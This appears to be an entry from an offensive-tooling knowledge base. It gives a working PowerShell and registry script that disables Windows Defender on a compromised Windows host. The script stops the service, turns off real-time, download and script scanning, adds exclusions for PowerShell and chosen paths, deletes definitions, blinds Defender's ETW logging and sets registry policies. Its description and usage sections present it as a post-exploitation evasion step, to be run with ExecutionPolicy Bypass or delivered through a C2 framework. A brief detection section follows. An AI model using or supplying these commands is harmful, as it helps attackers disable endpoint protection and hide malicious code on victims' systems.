---
id: 74bff4b6-6f07-4ccf-b4a2-7f76644d0b5f
type: code
language: PowerShell
verified: true
created_at: '2023-04-06T03:56:27.684583+00:00'
updated_at: '2023-04-10T20:37:26.823164+00:00'
tags:
  - disable-av
  - defense-evasion
  - persistence
platforms:
  - Windows
validated: true
---

# PowerShell-Windows-Defender-Disabler

## Code

```powershell
# Disable Defender
sc config WinDefend start= disabled
sc stop WinDefend
Set-MpPreference -DisableRealtimeMonitoring $true

## Exclude a process / location
Set-MpPreference -ExclusionProcess "word.exe", "vmwp.exe"
Add-MpPreference -ExclusionProcess 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe'
Add-MpPreference -ExclusionPath C:\Video, C:\install

# Disable scanning all downloaded files and attachments, disable AMSI (reactive)
PS C:\> Set-MpPreference -DisableRealtimeMonitoring $true; Get-MpComputerStatus
PS C:\> Set-MpPreference -DisableIOAVProtection $true
# Disable AMSI (set to 0 to enable)
PS C:\> Set-MpPreference -DisableScriptScanning 1 

# Blind ETW Windows Defender: zero out registry values corresponding to its ETW sessions
reg add "HKLM\System\CurrentControlSet\Control\WMI\Autologger\DefenderApiLogger" /v "Start" /t REG_DWORD /d "0" /f

# Wipe currently stored definitions
# Location of MpCmdRun.exe: C:\ProgramData\Microsoft\Windows Defender\Platform\<antimalware platform version>
MpCmdRun.exe -RemoveDefinitions -All

# Remove signatures (if Internet connection is present, they will be downloaded again):
PS > & "C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2008.9-0\MpCmdRun.exe" -RemoveDefinitions -All
PS > & "C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All

# Disable Windows Defender Security Center
reg add "HKLM\System\CurrentControlSet\Services\SecurityHealthService" /v "Start" /t REG_DWORD /d "4" /f

# Disable Real Time Protection
reg delete "HKLM\Software\Policies\Microsoft\Windows Defender" /f
reg add "HKLM\Software\Policies\Microsoft\Windows Defender" /v "DisableAntiSpyware" /t REG_DWORD /d "1" /f
reg add "HKLM\Software\Policies\Microsoft\Windows Defender" /v "DisableAntiVirus" /t REG_DWORD /d "1" /f
```

## Description

This PowerShell script comprehensively disables Windows Defender by stopping its service, disabling real-time monitoring and scanning features, adding exclusions for processes and paths, removing antivirus definitions and signatures, blinding ETW logging, and modifying registry policies to prevent real-time protection and Security Center functionality. It is designed for post-exploitation scenarios to evade detection and enable execution of malicious code.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| None | The script has no user-defined variables; paths like MpCmdRun.exe locations are hardcoded but may need adjustment based on Windows version. | N/A |

## Usage

Execute in an elevated PowerShell prompt on a Windows target: `powershell.exe -ExecutionPolicy Bypass -File disable_defender.ps1`. It can be delivered via remote execution (e.g., Invoke-Command in a C2 framework) or embedded in a larger payload. Run after gaining admin access to ensure persistence; re-execute if system policies reactivate Defender.

## Detection

- Monitor PowerShell logs for Set-MpPreference, sc config/stop WinDefend, and reg add/delete operations targeting Defender keys.
- Endpoint tools can detect MpCmdRun.exe with -RemoveDefinitions or unusual exclusions via Get-MpPreference.
- Registry auditing for changes in HKLM\Software\Policies\Microsoft\Windows Defender and service start types.
- Behavioral alerts for disabled AV services combined with anomalous process executions.

## Related

- [[procedures/Disable-Windows-Defender-via-PowerShell]]
